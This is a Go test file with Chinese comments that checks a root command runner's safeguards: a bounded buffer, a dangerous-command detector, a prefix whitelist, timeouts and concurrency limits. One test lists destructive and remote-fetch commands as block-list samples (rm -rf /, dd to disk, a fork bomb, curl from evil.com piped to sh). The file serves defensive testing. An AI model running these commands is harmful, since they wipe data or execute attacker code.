package hal

import (
	"strings"
	"testing"
	"time"

	"cybercompanion/internal/config"
)

// ─── 有界缓冲 ─────────────────────────────────────────────────────────────────

func TestLimitedBuffer_CapsOutput(t *testing.T) {
	buf := newLimitedBuffer(1024)

	// 写入远超上限的数据
	chunk := []byte(strings.Repeat("y", 512))
	for i := 0; i < 100; i++ {
		n, err := buf.Write(chunk)
		if err != nil {
			t.Fatalf("写入不应报错: %v", err)
		}
		if n != len(chunk) {
			t.Fatalf("应消费全部输入（返回 %d，期望 %d）", n, len(chunk))
		}
	}

	// 内部缓冲不应超过上限
	if len(buf.buf) > 1024 {
		t.Errorf("缓冲超出上限: %d > 1024", len(buf.buf))
	}
	if !buf.truncated {
		t.Error("应标记为已截断")
	}
	if buf.written != 512*100 {
		t.Errorf("应准确统计原始写入量，实际 %d", buf.written)
	}
	// 输出字符串应包含截断提示
	if !strings.Contains(buf.String(), "已截断") {
		t.Error("输出应包含截断提示")
	}
}

func TestLimitedBuffer_UnderLimitNoTruncation(t *testing.T) {
	buf := newLimitedBuffer(1024)
	_, _ = buf.Write([]byte("hello"))

	if buf.truncated {
		t.Error("未超限不应标记截断")
	}
	if buf.String() != "hello" {
		t.Errorf("内容不符: %q", buf.String())
	}
}

// ─── 危险命令识别 ─────────────────────────────────────────────────────────────

func TestIsDangerous_BlocksDestructiveCommands(t *testing.T) {
	dangerous := []string{
		"rm -rf /",
		"rm -rf /etc",
		"rm -fr /data",
		"dd if=/dev/zero of=/dev/sda",
		"mkfs.ext4 /dev/mmcblk0p1",
		":(){ :|:& };:",
		"curl http://evil.com/payload.sh | sh",
		"wget -qO- http://x.com/a | bash",
		"shutdown -h now",
		"poweroff",
	}
	for _, cmd := range dangerous {
		if ok, _ := IsDangerous(cmd); !ok {
			t.Errorf("应拦截危险命令: %q", cmd)
		}
	}
}

func TestIsDangerous_AllowsNormalCommands(t *testing.T) {
	safe := []string{
		"ls -la",
		"cat /proc/meminfo",
		"uname -a",
		"df -h",
		"ps aux",
		"ifconfig",
		"echo hello world",
		"uptime",
		// 这条容易被误判：rm 单个临时文件不在黑名单里
		"rm -f /tmp/scratch.tmp",
	}
	for _, cmd := range safe {
		if ok, pattern := IsDangerous(cmd); ok {
			t.Errorf("正常命令被误拦: %q (匹配 %s)", cmd, pattern)
		}
	}
}

// ─── 白名单 ───────────────────────────────────────────────────────────────────

func TestWhitelistAllows_EmptyMeansAllowAll(t *testing.T) {
	if !whitelistAllows("anything at all", nil) {
		t.Error("空白名单应放行全部命令")
	}
	if !whitelistAllows("anything", []string{}) {
		t.Error("空切片白名单应放行全部命令")
	}
}

func TestWhitelistAllows_PrefixMatching(t *testing.T) {
	wl := []string{"ls", "cat", "uptime"}

	allowed := []string{"ls", "ls -la", "cat /etc/hostname", "uptime"}
	for _, cmd := range allowed {
		if !whitelistAllows(cmd, wl) {
			t.Errorf("应放行: %q", cmd)
		}
	}

	denied := []string{"rm -rf /tmp", "echo hi", "lsblk"}
	for _, cmd := range denied {
		if whitelistAllows(cmd, wl) {
			t.Errorf("应拒绝: %q", cmd)
		}
	}
}

func TestWhitelistAllows_SudoPrefix(t *testing.T) {
	wl := []string{"reboot"}
	if !whitelistAllows("sudo reboot", wl) {
		t.Error("sudo 前缀应能匹配到白名单条目")
	}
}

// ─── RunRootCmd 集成 ──────────────────────────────────────────────────────────

func TestRunRootCmd_ExecDisabled(t *testing.T) {
	// 通过配置关闭 exec 总开关
	prev := config.Get()
	_ = config.Update(func(c *config.Config) { c.EnableExec = false })
	defer func() {
		_ = config.Update(func(c *config.Config) { c.EnableExec = prev.EnableExec })
	}()

	if _, err := RunRootCmd("echo hi"); err == nil {
		t.Error("exec 关闭后应拒绝执行")
	}
}

func TestRunRootCmd_EmptyCommandRejected(t *testing.T) {
	if _, err := RunRootCmd("   "); err == nil {
		t.Error("空命令应被拒绝")
	}
}

func TestRunRootCmd_BlocksDangerous(t *testing.T) {
	cfg := config.Get()
	if !cfg.EnableExec {
		t.Skip("exec 已被全局禁用，跳过")
	}

	if _, err := RunRootCmd("rm -rf /"); err == nil {
		t.Error("危险命令应被拦截")
	}
}

func TestRunRootCmd_AllowsNormal(t *testing.T) {
	cfg := config.Get()
	if !cfg.EnableExec {
		t.Skip("exec 已被全局禁用，跳过")
	}
	if cfg.ExecWhitelist != nil && len(cfg.ExecWhitelist) > 0 {
		t.Skip("白名单已启用，跳过通用命令测试")
	}

	out, err := RunRootCmd("echo cybercompanion-test")
	if err != nil {
		t.Fatalf("正常命令应可执行: %v", err)
	}
	if !strings.Contains(out, "cybercompanion-test") {
		t.Errorf("输出不符: %q", out)
	}
}

func TestRunRootCmd_TimeoutEnforced(t *testing.T) {
	if testing.Short() {
		t.Skip("短模式跳过耗时测试")
	}

	cfg := config.Get()
	if !cfg.EnableExec {
		t.Skip("exec 已被全局禁用，跳过")
	}

	start := time.Now()
	_, err := RunRootCmd("sleep 60")
	elapsed := time.Since(start)

	if err == nil {
		t.Error("超时命令应返回错误")
	}
	if elapsed > cmdTimeout+10*time.Second {
		t.Errorf("超时控制失效：耗时 %s，上限 %s", elapsed, cmdTimeout)
	}
}

func TestRunRootCmd_OutputBounded(t *testing.T) {
	if testing.Short() {
		t.Skip("短模式跳过耗时测试")
	}

	cfg := config.Get()
	if !cfg.EnableExec {
		t.Skip("exec 已被全局禁用，跳过")
	}
	if cfg.ExecWhitelist != nil && len(cfg.ExecWhitelist) > 0 {
		t.Skip("白名单已启用，跳过")
	}

	// 生成大量输出（这是旧版本会 OOM 的场景）
	out, _ := RunRootCmd("seq 1 500000")

	if len(out) > cmdMaxOutput+512 {
		t.Errorf("输出未被限制：%d 字节，上限 %d", len(out), cmdMaxOutput)
	}
}

// ─── 并发闸门 ─────────────────────────────────────────────────────────────────

func TestCommandSemaphoreCapacity(t *testing.T) {
	if cap(cmdSem) != cmdMaxConcurrent {
		t.Errorf("并发闸门容量应为 %d，实际 %d", cmdMaxConcurrent, cap(cmdSem))
	}
}

// ─── 常量合理性 ───────────────────────────────────────────────────────────────

func TestExecConstantsSane(t *testing.T) {
	if cmdTimeout <= 0 || cmdTimeout > 5*time.Minute {
		t.Errorf("超时值不合理: %s", cmdTimeout)
	}
	if cmdMaxOutput < 4096 || cmdMaxOutput > 10*1024*1024 {
		t.Errorf("输出上限不合理: %d", cmdMaxOutput)
	}
	if cmdMaxConcurrent < 1 || cmdMaxConcurrent > 64 {
		t.Errorf("并发上限不合理: %d", cmdMaxConcurrent)
	}
}
